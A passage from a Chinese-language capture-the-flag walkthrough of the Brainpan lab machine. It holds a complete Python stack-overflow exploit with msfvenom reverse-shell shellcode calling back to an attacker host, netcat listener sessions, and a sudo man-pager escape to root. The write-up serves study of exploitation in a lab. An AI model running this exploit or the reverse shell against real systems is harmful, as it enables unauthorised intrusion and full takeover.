    buf += b"\xbb\x34\x47\x8f\x2c\x3a\xa8\x6f\xad\x5b\x20\x8a"
    buf += b"\x9c\x5b\x56\xdf\x8f\x6b\x1c\x8d\x23\x07\x70\x25"
    buf += b"\xb7\x65\x5d\x4a\x70\xc3\xbb\x65\x81\x78\xff\xe4"
    buf += b"\x01\x83\x2c\xc6\x38\x4c\x21\x07\x7c\xb1\xc8\x55"
    buf += b"\xd5\xbd\x7f\x49\x52\x8b\x43\xe2\x28\x1d\xc4\x17"
    buf += b"\xf8\x1c\xe5\x86\x72\x47\x25\x29\x56\xf3\x6c\x31"
    buf += b"\xbb\x3e\x26\xca\x0f\xb4\xb9\x1a\x5e\x35\x15\x63"
    buf += b"\x6e\xc4\x67\xa4\x49\x37\x12\xdc\xa9\xca\x25\x1b"
    buf += b"\xd3\x10\xa3\xbf\x73\xd2\x13\x1b\x85\x37\xc5\xe8"
    buf += b"\x89\xfc\x81\xb6\x8d\x03\x45\xcd\xaa\x88\x68\x01"
    buf += b"\x3b\xca\x4e\x85\x67\x88\xef\x9c\xcd\x7f\x0f\xfe"
    buf += b"\xad\x20\xb5\x75\x43\x34\xc4\xd4\x0c\xf9\xe5\xe6"
    buf += b"\xcc\x95\x7e\x95\xfe\x3a\xd5\x31\xb3\xb3\xf3\xc6"
    buf += b"\xb4\xe9\x44\x58\x4b\x12\xb5\x71\x88\x46\xe5\xe9"
    buf += b"\x39\xe7\x6e\xe9\xc6\x32\x20\xb9\x68\xed\x81\x69"
    buf += b"\xc9\x5d\x6a\x63\xc6\x82\x8a\x8c\x0c\xab\x21\x77"
    buf += b"\xc7\x14\x1d\x3c\x80\xfd\x5c\xc2\xaa\x2f\xe9\x24"
    buf += b"\xd8\xdf\xbc\xff\x75\x79\xe5\x8b\xe4\x86\x33\xf6"
    buf += b"\x27\x0c\xb0\x07\xe9\xe5\xbd\x1b\x9e\x05\x88\x41"
    buf += b"\x09\x19\x26\xed\xd5\x88\xad\xed\x90\xb0\x79\xba"
    buf += b"\xf5\x07\x70\x2e\xe8\x3e\x2a\x4c\xf1\xa7\x15\xd4"
    buf += b"\x2e\x14\x9b\xd5\xa3\x20\xbf\xc5\x7d\xa8\xfb\xb1"
    buf += b"\xd1\xff\x55\x6f\x94\xa9\x17\xd9\x4e\x05\xfe\x8d"
    buf += b"\x17\x65\xc1\xcb\x17\xa0\xb7\x33\xa9\x1d\x8e\x4c"
    buf += b"\x06\xca\x06\x35\x7a\x6a\xe8\xec\x3e\x9a\xa3\xac"
    buf += b"\x17\x33\x6a\x25\x2a\x5e\x8d\x90\x69\x67\x0e\x10"
    buf += b"\x12\x9c\x0e\x51\x17\xd8\x88\x8a\x65\x71\x7d\xac"
    buf += b"\xda\x72\x54"
    a = b'A'*524+b'\xf3\x12\x17\x31'+b'\x90'*16+buf
    s = socket.socket()
    s.connect(('192.168.75.161',9999))
    r = s.recv(1024)
    s.send(a)
    s.close()
    ```
    
3. 现在windows运行brainpan.exe，然后再运行py文件
    
    获得测试机shell
    
    ```python
    nc -lvp 1234
    listening on [any] 1234 ...
    192.168.75.161: inverse host lookup failed: Unknown host
    connect to [192.168.75.151] from (UNKNOWN) [192.168.75.161] 49967
    Microsoft Windows [�汾 10.0.18363.418]
    (c) 2019 Microsoft Corporation����������Ȩ����
    
    C:\Users\ensp\Desktop>
    ```
    

## 获得shell

1. 生成linux下的反弹shell代码覆盖之前windows的
    
    ```python
    msfvenom -p linux/x86/shell_reverse_tcp -b '\x00\x0a\x0d' LHOST=192.168.75.151 LPORT=1234 -e x86/shikata_ga_nai -f python
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 95 (iteration=0)
    x86/shikata_ga_nai chosen with final size 95
    Payload size: 95 bytes
    Final size of python file: 479 bytes
    buf =  b""
    buf += b"\xdb\xcf\xbe\xfd\x3c\x9e\x52\xd9\x74\x24\xf4\x5f"
    buf += b"\x33\xc9\xb1\x12\x31\x77\x17\x03\x77\x17\x83\x3a"
    buf += b"\x38\x7c\xa7\xf5\x9a\x77\xab\xa6\x5f\x2b\x46\x4a"
    buf += b"\xe9\x2a\x26\x2c\x24\x2c\xd4\xe9\x06\x12\x16\x89"
    buf += b"\x2e\x14\x51\xe1\x70\x4e\xea\x66\x18\x8d\xed\x8c"
    buf += b"\x0b\x18\x0c\x3c\xcd\x4b\x9e\x6f\xa1\x6f\xa9\x6e"
    buf += b"\x08\xef\xfb\x18\xfd\xdf\x88\xb0\x69\x0f\x40\x22"
    buf += b"\x03\xc6\x7d\xf0\x80\x51\x60\x44\x2d\xaf\xe3"
    ```
    
2. 发送，获得shell
    
    ```python
    import socket
    buf =  b""
    buf += b"\xdb\xcf\xbe\xfd\x3c\x9e\x52\xd9\x74\x24\xf4\x5f"
    buf += b"\x33\xc9\xb1\x12\x31\x77\x17\x03\x77\x17\x83\x3a"
    buf += b"\x38\x7c\xa7\xf5\x9a\x77\xab\xa6\x5f\x2b\x46\x4a"
    buf += b"\xe9\x2a\x26\x2c\x24\x2c\xd4\xe9\x06\x12\x16\x89"
    buf += b"\x2e\x14\x51\xe1\x70\x4e\xea\x66\x18\x8d\xed\x8c"
    buf += b"\x0b\x18\x0c\x3c\xcd\x4b\x9e\x6f\xa1\x6f\xa9\x6e"
    buf += b"\x08\xef\xfb\x18\xfd\xdf\x88\xb0\x69\x0f\x40\x22"
    buf += b"\x03\xc6\x7d\xf0\x80\x51\x60\x44\x2d\xaf\xe3"
    a = b'A'*524+b'\xf3\x12\x17\x31'+b'\x90'*16+buf
    s = socket.socket()
    s.connect(('192.168.75.166',9999))
    r = s.recv(1024)
    s.send(a)
    s.close()
    ```
    
    ```python
    nc -lvp 1234
    listening on [any] 1234 ...
    192.168.75.166: inverse host lookup failed: Unknown host
    connect to [192.168.75.151] from (UNKNOWN) [192.168.75.166] 50714
    ls
    checksrv.sh
    web
    ```
    

## 提权

1. 尝试获得交互性更好的
    
    ```python
    python -c "import pty;pty.spawn('/bin/sh')"  
    $ 
    ```
    
2. 查看权限
    
    ```python
    $ id
    uid=1002(puck) gid=1002(puck) groups=1002(puck)
    //
    $ uname -a
    Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
    //
    $ ip add
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
        link/ether 00:0c:29:e7:37:be brd ff:ff:ff:ff:ff:ff
        inet 192.168.75.166/24 brd 192.168.75.255 scope global eth0
        inet6 fe80::20c:29ff:fee7:37be/64 scope link 
           valid_lft forever preferred_lft forever
    $ 
    //
    $ find / -perm -u=s -type f 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    /bin/umount
    /bin/su
    /bin/mount
    /bin/fusermount
    /bin/ping6
    /bin/ping
    /usr/bin/sudo
    /usr/bin/mtr
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/bin/sudoedit
    /usr/bin/chfn
    /usr/bin/traceroute6.iputils
    /usr/bin/at
    /usr/bin/lppasswd
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/sbin/uuidd
    /usr/sbin/pppd
    /usr/local/bin/validate
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/pt_chown
    //
    sudo -l
    Matching Defaults entries for puck on this host:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User puck may run the following commands on this host:
        (root) NOPASSWD: /home/anansi/bin/anansi_util
    
    ```
    
    发现anansi拥有sudo权限
    
3. 尝试提权
    
    ```python
    sudo /home/anansi/bin/anansi_util
    //
    Usage: /home/anansi/bin/anansi_util [action]
    Where [action] is one of:
      - network
      - proclist
      - manual [command]
    ```
    
    看到 `- manual [command]`可以跟命令
    
    ```python
    $ sudo /home/anansi/bin/anansi_util manual ls      
    sudo /home/anansi/bin/anansi_util manual ls
    No manual entry for manual
    WARNING: terminal is not fully functional
    -  (press RETURN)!/bin/bash
    ```
    
    这里有交互，因为输入了ls，所以应该使用root权限下执行的，我们尝试输入`!/bin/sh`
    
    ```python
    
    !/bin/bash
    root@brainpan:/usr/share/man#
    ```
    
    提权成功
    

## 总结

缓冲区溢出漏洞，ret2shellcode类型，补习坏字节检测以及nop